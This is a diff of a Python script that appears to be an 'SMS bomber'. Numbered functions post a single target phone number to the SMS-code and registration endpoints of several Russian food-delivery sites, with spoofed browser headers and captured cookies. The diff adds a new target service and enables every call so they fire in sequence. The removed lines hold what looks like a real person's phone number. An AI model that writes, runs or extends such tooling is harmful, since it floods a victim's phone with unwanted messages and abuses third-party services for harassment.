@@ -1,34 +1,6 @@
 import requests
 from pprint import pprint
-PHONE = "79374903539"
-def serv1():
-    try:
-        headers = {
-            'Accept-Language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
-            'Connection': 'keep-alive',
-            'Origin': 'https://surgut.hans-pizza.ru',
-            'Referer': 'https://surgut.hans-pizza.ru/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-site',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
-            'accept': 'application/json',
-            'content-type': 'application/json',
-            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'x-hans-city-code': 'surgut',
-            'x-hans-client-id': '1ec5dcb0-7e0c-4989-9194-536afaf04c1c',
-            'x-hans-device-type': 'site',
-            'x-hans-version-app': '1.2.3',
-        }
-        json_data = {
-            'phone': PHONE,
-        }
-        response = requests.post('https://api.hans-pizza.ru/api/auth/send', headers=headers, json=json_data)
-        print(f"serv1 - {response.status_code}")
-    except:
-        print(f"serv1 - error")
+PHONE = ""
 def serv2():
     try:
         cookies = {
@@ -114,37 +86,37 @@ def serv3():
 def serv4():
     try:
         cookies = {
-        '_ym_uid': '1773755867480796644',
-        '_ym_d': '1773755867',
-        '_ym_isad': '2',
-        '_ym_visorc': 'w',
-        'mgo_uid': 'WihPLeMlRTJl0InA002m',
-        'mgo_cnt': '1',
-        'mgo_sid': 'w00atc1qsc11001nc2lq',
+            '_ym_uid': '1773770465544724476',
+            '_ym_d': '1773770465',
+            'mgo_uid': 'EBLBuwBm18yu2IWziXDl',
+            'mgo_cnt': '3',
+            '_ym_isad': '2',
+            '_ym_visorc': 'w',
+            'mgo_sid': '60gbtdVqdp11003blexv',
         }
-        headers = {
-            'Accept': 'application/json, text/plain, */*, application/json, text/plain, */*',
-            'Accept-Language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
 
-            
-            'Connection': 'keep-alive',
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
+            'Accept': 'application/json, text/plain, */*, application/json, text/plain, */*',
+            'Accept-Language': 'en-US,en;q=0.5',
+            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
             'Content-Type': 'application/json',
             'Origin': 'https://tochka-vkusa.ru',
-            'Referer': 'https://tochka-vkusa.ru/catalog/pizza',
+            'Connection': 'keep-alive',
+            'Referer': 'https://tochka-vkusa.ru/',
+            # 'Cookie': '_ym_uid=1773770465544724876; _ym_d=1773770465; mgo_uid=E3LBuwBm18yu2IWziXDl; mgo_cnt=3; _ym_isad=2; _ym_visorc=w; mgo_sid=60gbtd6qdp11003blexv',
             'Sec-Fetch-Dest': 'empty',
             'Sec-Fetch-Mode': 'cors',
             'Sec-Fetch-Site': 'same-origin',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
-            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            # 'Cookie': '_ym_uid=1773755867480796644; _ym_d=1773755867; _ym_isad=2; _ym_visorc=w; mgo_uid=WihPLeMlRTJl0InA002m; mgo_cnt=1; mgo_sid=w00atc1qsc11001nc2lq',
+            'Priority': 'u=0',
         }
+
         json_data = {
             'phone': f"+{PHONE[0]} ({PHONE[1:4]}) {PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}",
-            'password': 'Fadka333',
-            'passwordReply': 'Fadka333',
+            'password': 'qwerty123',
+            'passwordReply': 'qwerty123',
         }
+
         response = requests.put('https://tochka-vkusa.ru/api/registration', cookies=cookies, headers=headers, json=json_data)
         print(f"serv4 - {response.status_code}")
     except:
@@ -635,17 +607,49 @@ def serv15():
         print(f"serv15 - {response.status_code}")
     except:
         print("serv15 - error")
-# serv1()
-# serv2()
-# serv3()
-# serv4()
-# serv5()
-# serv6()
-# serv7()
-# serv8()
-# serv9()
-# serv10()
-# serv11()
-# serv12()
-# serv13()
-# serv15()
+def serv16():
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
+            'Accept': 'application/json',
+            'Accept-Language': 'en-US,en;q=0.5',
+            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'Content-Type': 'application/json;charset=utf-8',
+            'X-Store-Id': '940eecaf-59d8-46d6-b73d-319cfc5a3d4c',
+            'X-Timezone': 'America/Chicago',
+            'X-Zenky-Client': 'web',
+            'X-Zenky-Version': '2.135.2',
+            'Origin': 'https://sushihouse39.ru',
+            'Connection': 'keep-alive',
+            'Referer': 'https://sushihouse39.ru/',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'cross-site',
+            # Requests doesn't support trailers
+            # 'TE': 'trailers',
+        }
+
+        json_data = {
+            'phone': f'+{PHONE}',
+            'phone_country': 'RU',
+            'password': 'qwerty123',
+        }
+
+        response = requests.post('https://api.zenky.io/v2/auth/register', headers=headers, json=json_data)
+        print(f"serv16 - {response.status_code}")
+    except:
+        print(f"serv16 - error")
+serv2()
+serv3()
+serv4()
+serv5()
+serv6()
+serv7()
+serv8()
+serv9()
+serv10()
+serv11()
+serv12()
+serv13()
+serv15()
+serv16()
